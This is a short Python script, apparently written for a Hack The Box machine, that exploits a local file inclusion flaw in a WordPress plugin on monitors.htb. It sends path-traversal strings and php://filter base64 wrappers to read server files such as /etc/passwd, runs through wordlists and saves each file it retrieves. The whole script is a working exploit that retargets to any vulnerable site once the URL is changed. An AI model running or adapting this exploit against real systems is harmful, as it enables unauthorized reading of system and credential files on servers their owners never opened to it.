
import requests
import sys
import base64
import os
from datetime import datetime

####
#Easy, simple lfi tool for enumerate multiple potential files
#Best run in a folder as lots of files may get created when using wordlists
#Examples given show the exact syntax
####

def lfi(filename): 
	##Change this to your vulnerable URL
	url = 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=' + filename
	r = requests.get(url)
	response = r.content
	return response

if len(sys.argv) != 4:
	##Provide mode, standard or base64
	##Provide file or wordlist with file <filename> or wordlist <wordlist>
	print("You need to provide a mode and filename!")
	print("Example: python3 easy_as_lfi.py b64 file /etc/passwd")
	print("Example: python3 easy_as_lfi.py standard wordlist lfi_list.txt")
	sys.exit()

else:
	print("[*] The tool has started running. It will notify you if anything is discovered.")
	##You may need to edit the number of directories that needs traversing by adding ../ or removing some
	if sys.argv[1] == 'b64':
		if sys.argv[2] == 'file':
			filename = 'php://filter/convert.base64-encode/resource=../../../../../../../../../' + sys.argv[3]
			result = lfi(filename)
			result = base64.b64decode(result)
			result = result.decode('utf-8')
			if len(result) > 2:
				with open(sys.argv[3].replace('/','_'), "w+") as f:
					print(f"[*] Looks like we retrieved the file: {sys.argv[3]}. Base64 decoded and saved.")
					f.write(result)
					f.close()
			else:
				print("[!] Looks like that file didn't exist or the script is set up wrong. Check URL and ../../ amount.")
				sys.exit()
		elif sys.argv[2] == 'wordlist':
			wordlist = sys.argv[3]
			with open(wordlist, "r")  as f:
				f = f.readlines()
				for file in f:
					file = file.strip()
					filename = 'php://filter/convert.base64-encode/resource=../../../../../../../../../' + file
					result = lfi(filename)
					result = base64.b64decode(result)
					result = result.decode('utf-8')
					##If there's any meaningful result, save to a file in a results folder
					if len(result) > 2:
						with open(file.replace('/','_'), "w+") as f:
							print(f"[*] Looks like we retrieved the file: {file}. Base64 decoded and saved.")
							f.write(result)
							f.close()
		else:
			print("[!] Is this a file you're looking for or using a wordlist? Specify as per the examples!")
			sys.exit()
					

	
	elif sys.argv[1] == 'standard':
		if sys.argv[2] == 'file':
			filename = '../../../../../../../../../' + sys.argv[3]
			result = lfi(filename)
			result = result.decode('utf-8')
			if len(result) > 2:
				with open(sys.argv[3].replace('/','_'), "w+") as f:
					print(f"[*] Looks like we retrieved the file: {filename}. Base64 decoded and saved.")
					f.write(result)
					f.close()
			else:
				print("[!] Looks like that file didn't exist or the script is set up wrong. Check URL and ../../ amount.")
				sys.exit()
		elif sys.argv[2] == 'wordlist':
			wordlist = sys.argv[3]
			with open(wordlist, "r")  as f:
				f = f.readlines()
				for file in f:
					file = file.strip()
					filename = '../../../../../../../../../' + file
					result = lfi(filename)
					result = result.decode('utf-8')
					##If there's any meaningful result, save to a file in a results folder
					if len(result) > 2:
						with open(file.replace('/','_'), "w+") as f:
							print(f"[*] Looks like we retrieved the file: {file}. It's been saved.")
							f.write(result)
							f.close()

		else:
			print("[!] Is this a file you're looking for or using a wordlist? Specify as per the examples!")
			sys.exit()

	else: 
		print("[!] No mode selected! b64 or standard.\n[!] Remember to specify file or wordlist!")
		sys.exit()
